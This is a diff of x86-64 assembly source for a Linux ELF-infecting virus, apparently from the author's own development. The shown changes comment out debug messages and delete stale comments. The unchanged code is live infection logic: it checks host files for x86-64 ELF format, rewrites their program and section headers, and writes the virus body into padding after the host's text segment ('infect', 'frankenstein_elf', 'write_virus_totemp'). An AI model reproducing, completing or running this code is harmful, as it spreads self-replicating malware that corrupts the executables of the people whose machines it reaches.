@@ -254,40 +254,40 @@ targetdirlen equ $-targetdir
 ;
 ;****************************************************************************************
 
-checkelfpass db 'File is an ELF!', 13, 10, 0
-checkelfpasslen equ $-checkelfpass
-
-checkelffail db 'File is not an ELF!', 13, 10, 0
-checkelffaillen equ $-checkelffail
-
-checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
-checkfiledtreg_fail_len equ $-checkfile_dtreg_fail
-
-checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
-checkelf_etype_faillen equ $-checkelf_etype_fail
-
-check64pass db 'File is an ELFCLASS64!', 13, 10, 0
-check64passlen equ $-check64pass
-check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
-check64faillen equ $-check64fail
-
-checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
-checkarchpasslen equ $-checkarchpass
-checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
-checkarchfaillen equ $-checkarchfail
-
-checkphdrstart db 'Beginning of phdr_loop', 13,10,0
-checkphdrstartlen equ $-checkphdrstart
-
-checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
-checkptloadpasslen equ $-checkptloadpass
-checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
-checkptloadfaillen equ $-checkptloadfail
-
-textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
-textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
-textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
-textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
+;checkelfpass db 'File is an ELF!', 13, 10, 0
+;checkelfpasslen equ $-checkelfpass
+;
+;checkelffail db 'File is not an ELF!', 13, 10, 0
+;checkelffaillen equ $-checkelffail
+;
+;checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
+;checkfiledtreg_fail_len equ $-checkfile_dtreg_fail
+;
+;checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
+;checkelf_etype_faillen equ $-checkelf_etype_fail
+;
+;check64pass db 'File is an ELFCLASS64!', 13, 10, 0
+;check64passlen equ $-check64pass
+;check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
+;check64faillen equ $-check64fail
+;
+;checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
+;checkarchpasslen equ $-checkarchpass
+;checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
+;checkarchfaillen equ $-checkarchfail
+;
+;checkphdrstart db 'Beginning of phdr_loop', 13,10,0
+;checkphdrstartlen equ $-checkphdrstart
+;
+;checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
+;checkptloadpasslen equ $-checkptloadpass
+;checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
+;checkptloadfaillen equ $-checkptloadfail
+;
+;textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
+;textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
+;textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
+;textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
 ;****************************************************************************************
 
 ;variables used for phdr and shdr manipulation routines
@@ -338,8 +338,8 @@ O_APPEND		equ 2000o
 
 SEEK_CUR 		equ 0x1
 
-S_IFREG    		dq 0x0100000   ;regular file
-S_IFMT 			dq 0x0170000
+;S_IFREG    		dq 0x0100000   ;regular file
+;S_IFMT 			dq 0x0170000
 
 ;mode 		dd 0
 ;S_ISREG		equ (mode & S_IFMT)
@@ -362,7 +362,6 @@ ELFX8664		equ 0x3e
 DT_REG 			equ 0x8
 
 ;PHDR vals
-;PT_LOAD 	dd 1
 PT_LOAD 	equ 0x1
 PFLAG_R	equ 0x4
 PFLAG_X	equ 0x1
@@ -371,8 +370,6 @@ PFLAG_W	equ 0x2
 MAX_RDENT_BUF	times 0x800 db 0 
 MAX_RDENT_BUF_SIZE equ 0x800
 
-;num_dir_entries resq 0x0
-;root_dirent:	dq 0 
 
 ;;file pointed to by fstat is fd
 
@@ -573,8 +570,8 @@ check_file:
 		test rax, rax
 		js checknext
 	check_elf_header_etype:
-		lea r13, checkelf_etype_fail
-		mov r12, checkelf_etype_faillen
+		;lea r13, checkelf_etype_fail
+		;mov r12, checkelf_etype_faillen
 		cmp word [rax + elf_ehdr.e_type], 0x0002
 		je check_elf_header_magic_bytes
 		cmp word [rax + elf_ehdr.e_type], 0x0003
@@ -608,8 +605,8 @@ check_file:
 		;jmp ready2infect
 	
 	check_elf_header_arch:
-		lea r13, checkarchfail
-		mov r12, checkarchfaillen
+		;lea r13, checkarchfail
+		;mov r12, checkarchfaillen
 		;cmp byte [r14+800+elf_ehdr + 18], ELFX8664
 		cmp byte [rax + elf_ehdr.e_machine], 0x3e
 		jne checknext
@@ -727,18 +724,18 @@ infect:
 	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
 	mov r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
 	mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
-	;mov qword [hostentry_offset], r13	;move r13 to saved var hostentry_offset, 
+	;move r13 to saved var hostentry_offset, 
 									;to be used for calculating offsets w writes to temp file
-	mov rdx, checkphdrstartlen
-	lea rsi, checkphdrstart
-	mov rdi, STDOUT
-	mov rax, SYS_WRITE
-	syscall
-
 	
-;;	mov qword r11, [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
-;;	mov qword [vxhostentry], r11
+	;mov rdx, checkphdrstartlen
+	;lea rsi, checkphdrstart
+	;mov rdi, STDOUT
+	;mov rax, SYS_WRITE
+	;syscall
 
+;	
+; save original host file entry point for jmp in vx code
+;
 ;****************************************************************************************
 ;	Update program headers of infected ELF
 ;
@@ -833,7 +830,6 @@ infect:
 			add dword r11d, [r13 + r15 + elf_shdr.sh_size]
 			cmp dword r11d, [vxoffset]
 			jne .mod_subsequent_shdr
-		;	add word [r13 + r15 + elf_shdr.sh_size], vlen
 			mov dword r10d, [r13 + r15 + elf_shdr.sh_size]
 			add dword r10d, vlen
 			mov dword [r13 + r15 + elf_shdr.sh_size], r10d
@@ -842,7 +838,6 @@ infect:
 				mov r11, [r13 + r15 + elf_shdr.sh_offset]
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
-				;add dword [r13 + r15 + elf_shdr.sh_offset], PAGESIZE
 		.next_shdr:
 			dec cx 
 			add r12w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
@@ -851,7 +846,6 @@ infect:
 	lea r10, [r13 + elf_ehdr.e_shoff]
 	mov [SHDR_OFFSET_HOST], r10
 	mov r11, [r13 + elf_ehdr.e_shoff]
-;	mov qword [SHDR_OFFSET_HOST], r11
 	mov dword [oshoff], r11d
 	cmp dword r11d, [vxoffset]
 	jg .patch_ehdr_shoff
@@ -931,11 +925,6 @@ frankenstein_elf:
 		;mov rax, SYS_WRITE
 		;syscall
 
-		;xor rdx, rdx	
-		;mov rdx, [hostentry_offset]
-		;mov rdx, [hosttext_start]
-		;mov rdx, [evaddr]
-		;mov rdx, [vxoffset]
 		add dword edx, [vxoffset]
 		jmp .write_host_ehdr_phdrs_textsegment
 	.offset_ehdr_phdr_copy_pagesize:
@@ -945,25 +934,13 @@ frankenstein_elf:
 		;mov rax, SYS_WRITE
 		;syscall
 		
-		;xor rdx, rdx	
 		mov rdx, [PAGESIZE]
 	.write_host_ehdr_phdrs_textsegment:	
 		mov rdi, r9
 		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
-;		jmp .close_temp		
 
-	;.write_hosttextsegment:
-		;;mov rcx, [evaddr]
-		;;sub rcx, [hostentry_offset]
-		;;mov rdx, rcx
-	;	mov rdx, [PAGESIZE]
-	;	mov rsi, [r13 + hostentry_offset]					;r13 contains pointer to mmap'd file
-	;	mov rsi, r13
-	;	add rsi, hostentry_offset
-	;	mov rax, SYS_WRITE
-	;	syscall
 	.write_virus_totemp:
 		mov rdi, r9
 		mov rdx, vlen
@@ -971,8 +948,6 @@ frankenstein_elf:
 		mov r10d, [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
-
-;		jmp .close_temp		
 		mov rsi, rax
 	
 	;ftruncate syscall will grow the size of file (corresponding to file descriptor fd)
@@ -981,24 +956,18 @@ frankenstein_elf:
 	;before we write the original host data segment to the temp file
 	.write_padding_after_vx:
 		mov esi, dword [data_offset_new_padding]
-		;add esi, dword [PAGESIZE]
 		mov rax, SYS_FTRUNCATE
 		syscall
-;		jmp .close_temp		
 	.write_datasegment_totemp:
-		;mov rdx, [r14 + filestat.st_size]
-		;mov rdx, [SHDR_OFFSET_HOST]
 		mov rdx, [oshoff]
 		sub edx, dword [data_offset_original]
 		mov rsi, [DATA_OFFSET_HOST]
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
-;		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
 		mov rdx, [r14 + filestat.st_size]
-		;sub edx, dword [data_offset_new_padding]
 		sub edx, dword [oshoff]
 		mov rsi, [SHDR_OFFSET_HOST]
 		mov r10d, dword [vxshoff]
